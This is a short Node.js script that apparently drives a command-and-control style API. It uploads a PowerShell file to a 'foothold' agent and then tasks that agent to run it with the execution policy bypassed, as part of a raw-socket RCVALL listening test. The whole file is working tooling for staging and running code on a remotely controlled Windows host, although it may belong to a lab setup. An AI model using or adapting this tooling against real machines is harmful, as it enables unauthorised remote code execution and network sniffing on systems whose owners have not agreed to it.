// run-matrix5.mjs <footholdId> — stage + run guest-icmp-matrix5.ps1 (RCVALL test)
// as a direct foothold task (blocks the task loop ~20s, acceptable; output <=120 chars).
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2];
if (!FOOTHOLD) { console.error('usage: node run-matrix5.mjs <footholdId>'); process.exit(2); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { readFileSync } = await import('node:fs');

async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 60) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}

const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-matrix5.ps1', b64: readFileSync(new URL('./guest-icmp-matrix5.ps1', import.meta.url)).toString('base64') });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));
const t = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\agentbox\\guest-icmp-matrix5.ps1' });
console.log('RCVALL-LISTEN:', JSON.stringify(await waitTask(FOOTHOLD, t.taskId, 60)));
